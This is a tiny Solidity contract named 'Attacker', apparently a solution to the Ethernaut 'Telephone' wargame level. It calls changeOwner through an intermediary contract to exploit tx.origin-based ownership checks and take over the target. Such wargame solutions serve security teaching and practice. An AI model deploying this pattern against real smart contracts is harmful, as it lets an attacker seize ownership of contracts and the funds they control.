pragma solidity ^0.6.0;

import "./Telephone.sol";

contract Attacker {
    function attack(address _instance) public {
        Telephone(_instance).changeOwner(msg.sender);
    }
}
